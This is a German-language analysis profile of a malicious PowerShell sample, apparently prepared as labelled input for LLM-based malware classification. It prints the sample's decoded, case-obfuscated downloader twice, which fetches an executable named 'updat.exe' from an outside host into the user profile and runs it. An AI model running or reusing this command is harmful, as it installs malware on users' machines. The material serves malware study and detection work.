# Steckbrief: 026ccb13ef7903f6cb39a85357181a613588b7118ea61b3580152aca02879638.ps1

- SHA256: `026ccb13ef7903f6cb39a85357181a613588b7118ea61b3580152aca02879638`
- Groesse: 792 Bytes, 1 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 0 (Auszug unten)
- Base64-Bloecke gesamt: 1, davon dekodierbar: 1
- Dekodierter Base64-Block (Laenge 696):
  ```
  [Net.ServIcePOiNtmanageR]::sEcURitYPROToCol = 	[net.SeCuRItYPrOtocoLtypE]::Tls12  ;   Irm 	-Uri 	(”http://ozzyingilizce.com/wp-content/sgu/0”  + ”26130784100001.ex”  + ”e” ) 	-OuTFilE ”$ENV:USerPROfilE\updat.exe” 	;  InvOKe-iTem  ”$EnV:userProfIlE\updat.exe”
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)

## Stufe 3 - Struktur (zusaetzlich)
- Dekodierte Befehle (Auszug):
  ```
  [Net.ServIcePOiNtmanageR]::sEcURitYPROToCol = 	[net.SeCuRItYPrOtocoLtypE]::Tls12  ;   Irm 	-Uri 	(”http://ozzyingilizce.com/wp-content/sgu/0”  + ”26130784100001.ex”  + ”e” ) 	-OuTFilE ”$ENV:USerPROfilE\updat.exe” 	;  InvOKe-iTem  ”$EnV:userProfIlE\updat.exe”
  ```
